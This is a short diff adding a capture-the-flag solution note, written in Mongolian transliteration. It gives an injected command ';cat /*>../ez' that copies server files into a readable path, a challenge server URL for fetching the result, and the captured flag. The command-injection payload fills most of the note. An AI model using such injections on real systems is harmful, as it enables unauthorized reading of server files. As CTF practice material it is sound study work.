@@ -1,0 +1,4 @@
+1. ;cat /*>../ez (server der bga buh file iin utgiig /ez luu huulna)
+2. https://139.162.5.230:10095/ez
+
+flag : HZU18{W0W_U_G0T_EY3Z_R3ALLYY?}
